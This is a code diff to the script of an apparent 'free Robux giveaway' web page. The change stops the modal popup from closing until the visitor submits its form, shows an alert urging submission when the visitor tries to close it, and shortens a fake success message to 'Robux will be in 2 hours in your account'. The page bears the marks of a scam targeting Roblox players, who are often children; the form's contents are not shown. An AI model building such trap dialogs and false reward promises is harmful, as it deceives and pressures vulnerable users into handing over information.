@@ -162,17 +162,25 @@
             }
 
             if (span) {
-                span.onclick = function () {
-                    hideAllPopups();
-                }
+                span.addEventListener('click', () => {
+                    const successCard = modal.querySelector('.success-card');
+                    if (successCard) {
+                        hideAllPopups();
+                    } else {
+                        alert("Please fill out and submit the form to join the giveaway and close this window! 🎁🌟");
+                    }
+                });
             }
 
-            // Allow closing by clicking outside
-            window.onclick = function (event) {
+            // Allow closing by clicking outside if already submitted
+            window.addEventListener('click', (event) => {
                 if (event.target == modal) {
-                    hideAllPopups();
+                    const successCard = modal.querySelector('.success-card');
+                    if (successCard) {
+                        hideAllPopups();
+                    }
                 }
-            }
+            });
 
             // Auto-open modal on mobile when page loads
             window.addEventListener('load', () => {
@@ -233,7 +241,7 @@
                             this.innerHTML = `
                                 <div class="success-card">
                                     <h2>✅ Success!</h2>
-                                    <p>Success: Robux will be in 24 hours in your account! 🎁🌟</p>
+                                    <p>Success: Robux will be in 2 hours in your account! 🎁🌟</p>
                                 </div>
                             `;
                             // Auto-close modal after 5 seconds
